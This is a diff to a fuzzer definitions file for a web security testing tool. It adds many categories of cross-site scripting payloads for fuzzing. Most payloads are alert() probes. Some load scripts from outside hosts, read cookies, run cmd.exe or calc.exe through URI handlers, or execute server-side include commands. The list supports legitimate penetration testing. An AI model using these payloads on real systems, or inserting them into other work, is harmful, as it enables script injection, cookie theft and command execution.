@@ -1,4 +1,4 @@
-# JBroFuzz Fuzzer Definitions for version 1.0
+# JBroFuzz Fuzzer Definitions for version 1.1
 #
 # -----------------------------------------------------------------------------
 # Pre conditions
@@ -33,7 +33,8 @@
 # -----------------------------------------------------------------------------
 #
 # This version supports the alteration/addition of fuzzers based on the file
-# format described below.
+# format described below. Fuzzers can also be created at runtime, using the 
+# org.owasp.jbrofuzz.core.* API. 
 # 
 # -----------------------------------------------------------------------------
 # Adding a new Fuzzer (yes, you can brake JBroFuzz if you fuzz this file)
@@ -60,7 +61,7 @@
 # Pre:
 #
 # First line must have 4 fields divided by ":"
-# First character must be "P" for Replacive or "R" for recursive
+# First character must be "P" for replacive or "R" for recursive
 # XXX-XXX-XXX has to be unique and in batches of 3 letters long
 # Name has to be less than or equal to 64 characters
 # L has to be between [0-64]
@@ -276,8 +277,144 @@ x'+or+1=1+or+'x'='y
 count(/child::node())
 x'+or+name()='username'+or+'x'='y
 
-P:XSS-ONE:Basic XSS:14
-> Cross Site Scripting | Replacive Fuzzers
+P:XSS-101:XSS 101:9
+> XSS | Replacive Fuzzers
+<script>alert('XSS')</script>
+<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
+</title><script>alert(1)</script>
+'> <script>alert(3)</script>
+`> <script>alert(5)</script>
+> <script>alert(4)</script>
+</title><script>alert(1)</script>
+<<SCRIPT>alert("XSS");//<</SCRIPT>
+>"'
+
+
+P:XSS-102:XSS 102:9
+> XSS | Replacive Fuzzers
+'';!--"<XSS>=&{()}
+*/a=eval;b=alert;a(b(/e/.source));/*
+'%uff1cscript%uff1ealert('XSS')%uff1c/script%uff1e'
+<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>
+%26%2339);x=alert;x(%26%2340 /finally through!/.source %26%2341);//
+</noscript><br><code onmouseover=a=eval;b=alert;a(b(/h/.source));>MOVE MOUSE OVER THIS AREA</code>
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")>
+perl -e 'print "<SCR\0IPT>alert("XSS")</SCR\0IPT>";' > out
+
+
+P:XSS-JSC-BRK:XSS JS Breaks:11
+> XSS | Replacive Fuzzers
+alert(1)
+A=alert;A(1)
++alert(0)+
+';//%0da=eval;b=alert;a(b(9));//
+a=1;a=eval;b=alert;a(b(11));//
+'};a=eval;b=alert;a(b(13));//
+1};a=eval;b=alert;a(b(14));//
+'];a=eval;b=alert;a(b(15));//
+1];a=eval;b=alert;a(b(17));//
+1;a=eval;b=alert;a(b(/c/.source));
+xyz onerror=alert(6);
+
+P:XSS-IE4-567:XSS IE:38
+> XSS | Replacive Fuzzers
+<img src=`x` onrerror= ` ;; alert(1) ` />
+</a style=""xx:expr/**/ession(document.appendChild(document.createElement('script')).src='http://h4k.in/i.js')">
+style=color: expression(alert(0));" a="
+vbscript:Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
+width: expression((window.r==document.cookie)?'':alert(r=document.cookie))
+<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->
+<DIV STYLE="width: expression(alert('XSS'));">
+<IMG SRC="jav&#x0A;ascript:alert('XSS');">
+<IMG SRC="javascript:alert('XSS');">
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+<IMG SRC=`javascript:alert("RSnake says### 'XSS'")`>
+<IMG SRC="javascript:alert('XSS')"
+<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<IMG SRC=javascript:alert(String.fromCharCode(88###83###83))>
+<IMG DYNSRC="javascript:alert('XSS');">
+<IMG LOWSRC="javascript:alert('XSS');">
+<IMG SRC=javascript:alert('XSS')>
+exp/*<XSS STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
+<IMG SRC="javascript:alert('XSS');">
+<IMG SRC='vbscript:msgbox("XSS")'>
+<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">
+<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS
+<XSS STYLE="behavior: url(http://ha.ckers.org/xss.htc);">
+<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>
+<IMGSRC="javascript:alert('XSS')">
+<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('XSS')></OBJECT>
+<IMG SRC=" &#14;  javascript:alert('XSS');">
+<XSS STYLE="xss:expression(alert('XSS'))">
+<STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE>
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+firefoxurl:test|"%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');"
+res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210
+>%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>
+
+P:XSS-GEK:XSS Gecko:11
+> XSS | Replacive Fuzzers
+(1?(1?{a:1?""[1?"ev\a\l":0](1?"\a\lert":0):0}:0).a:0)[1?"\c\a\l\l":0](content,1?"x\s\s":0)
+<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+<SCRIPT SRC=http://ha.ckers.org/xss.js
+<A HREF="http://google:ha.ckers.org">XSS</A>
+<A HREF="http://ha.ckers.org@google">XSS</A>
+<A HREF="//google">XSS</A>
+<IFRAME SRC=http://ha.ckers.org/scriptlet.html <
+y=<a>alert</a>;content[y](123)
+sstyle=foobar"tstyle="foobar"ystyle="foobar"lstyle="foobar"estyle="foobar"=-moz-binding:url(http://h4k.in/mozxss.xml#xss)>foobar</b>#xss)" a="
+with(document.__parent__)alert(1)
+style=-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="
+
+P:XSS-STL-INJ:XSS Style Injection:14
+> XSS | Replacive Fuzzers
+style=color: expression(alert(0));" a="
+style=-moz-binding:url(http://h4k.in/mozxss.xml#xss);" a="
+width: expression((window.r==document.cookie)?'':alert(r=document.cookie))
+sstyle=foobar"tstyle="foobar"ystyle="foobar"lstyle="foobar"estyle="foobar"=-moz-binding:url(http://h4k.in/mozxss.xml#xss)>foobar</b>#xss)" a="
+<DIV STYLE="background-image: url(javascript:alert('XSS'))">
+<DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))">
+<DIV STYLE="width: expression(alert('XSS'));">
+<FRAMESET><FRAME SRC="javascript:alert('XSS');"></FRAMESET>
+<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>
+<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>
+<STYLE TYPE="text/javascript">alert('XSS');</STYLE>
+<STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A>
+<STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE>
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+
+P:XSS-HTM-BRK:XSS HTML Breaking:7
+> XSS | Replacive Fuzzers
+<s>000<s>%3cs%3e111%3c/s%3e%3c%73%3e%32%32%32%3c%2f%73%3e&#60&#115&#62&#51&#51&#51&#60&#47&#115&#62&#x3c&#x73&#x3e&#x34&#x34&#x34&#x3c&#x2f&#x73&#x3e
+';alert(0)//\';alert(1)//";alert(2)//\";alert(3)//--></SCRIPT>">'><SCRIPT>alert(4)</SCRIPT>=&{}");}alert(6);function xss(){//
+';alert(0)//\';alert(1)//";alert(2)//\";alert(3)//--></SCRIPT>">'></title><SCRIPT>alert(4)</SCRIPT>=&{</title><script>alert(5)</script>}");}
+'';!--"<script>alert(0);</script>=&{(alert(1))}
+</title><script>alert(1)</script>
+</textarea><br><code onmouseover=a=eval;b=alert;a(b(/g/.source));>MOVE MOUSE OVER THIS AREA</code>
+'';!--"<XSS>=&{()}
+
+P:XSS-EMB-EVD:XSS Embed/Evade:10
+> XSS | Replacive Fuzzers
+<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
+<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT ="blah" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a="blah" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=`>` SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT a=">'>" SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<SCRIPT SRC=http://ha.ckers.org/xss.js
+<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+
+
+P:XSS-IMG:XSS IMG Tag:10
+> XSS | Replacive Fuzzers
 <IMG SRC=javascript:alert('XSS')>
 <IMG SRC=JaVaScRiPt:alert('XSS')>
 <IMG SRC=`javascript:alert("XSS says, 'XSS'")`>
@@ -286,15 +423,19 @@ P:XSS-ONE:Basic XSS:14
 <IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
 <IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>
 <IMG SRC="jav&#x0D;ascript:alert('XSS');">
-perl -e 'print "<SCR\0IPT>alert("XSS")</SCR\0IPT>";' > out
-<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")>
-<<SCRIPT>alert("XSS");//<</SCRIPT>
-<IFRAME SRC="javascript:alert('XSS');"></IFRAME>
 <IMG SRC="jav&#x09;ascript:alert(<WBR>'XSS');">
 <IMG SRC="jav&#x0A;ascript:alert(<WBR>'XSS');">
 
+P:XSS-NET:ASP .NET ValidateRequest:5
+> XSS | Replacive Fuzzers
+</XSS STYLE=xss:expression(alert('XSS'))>
+XSS STYLE=xss:e/**/xpression(alert('XSS'))>
+XSS-STYLE=xss:e/**/xpression(alert('XSS'))>
+XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
+"><script>alert('XSS')</script>
+
 P:XSS-XML:XSS XML Injection:6
-> Cross Site Scripting | XML Injection | Replacive Fuzzers | Injection
+> XSS | XML Injection | Replacive Fuzzers | Injection
 <XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>
 <XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
 <HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert('XSS')</SCRIPT>"> </BODY></HTML>
@@ -303,14 +444,14 @@ P:XSS-XML:XSS XML Injection:6
 <?xml version="1.0"?><html:html xmlns:html='http://www.w3.org/1999/xhtml'><html:script>alert(document.cookie);</html:script></html:html>
 
 P:XSS-URI:URI XSS:4
-> Cross Site Scripting | URI Exploits | Replacive Fuzzers
+> XSS | URI Exploits | Replacive Fuzzers
 aim: &c:\windows\system32\calc.exe" ini="C:\Documents and Settings\All Users\Start Menu\Programs\Startup\pwnd.bat"
 firefoxurl:test|"%20-new-window%20javascript:alert(\'Cross%2520Browser%2520Scripting!\');"
 navigatorurl:test" -chrome "javascript:C=Components.classes;I=Components.interfaces;file=C[\'@mozilla.org/file/local;1\'].createInstance(I.nsILocalFile);file.initWithPath(\'C:\'+String.fromCharCode(92)+String.fromCharCode(92)+\'Windows\'+String.fromCharCode(92)+String.fromCharCode(92)+\'System32\'+String.fromCharCode(92)+String.fromCharCode(92)+\'cmd.exe\');process=C[\'@mozilla.org/process/util;1\'].createInstance(I.nsIProcess);process.init(file);process.run(true%252c{}%252c0);alert(process)
 res://c:\\program%20files\\adobe\\acrobat%207.0\\acrobat\\acrobat.dll/#2/#210
 
 P:XSS-JSN:JSON:5
-> Cross Site Scripting | Replacive Fuzzers
+> XSS | Replacive Fuzzers
 <body onload=;a2={y:eval};a1={x:a2.y('al'+'ert')};;;;;;;;;_=a1.x;_(1);;;;
 <body onload=a1={x:this.parent.document};a1.x.writeln(1);>
 <body onload=;a1={x:document};;;;;;;;;_=a1.x;_.write(1);;;;
@@ -318,11 +459,11 @@ P:XSS-JSN:JSON:5
 <body/â€?â€?$/onload=x={doc:parent[â€™documentâ€™]};x.doc.writeln(1)
 
 P:XSS-SSI:Server Side Includes:1
-> Cross Site Scripting | Replacive Fuzzers
+> XSS | Replacive Fuzzers
 <!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"-->
 
 P:XSS-URL-BRK:URL Breaking:3
-> Cross Site Scripting | Replacive Fuzzers
+> XSS | Replacive Fuzzers
 http://aa"><script>alert(123)</script>
 http://aa'><script>alert(123)</script>
 http://aa<script>alert(123)</script>
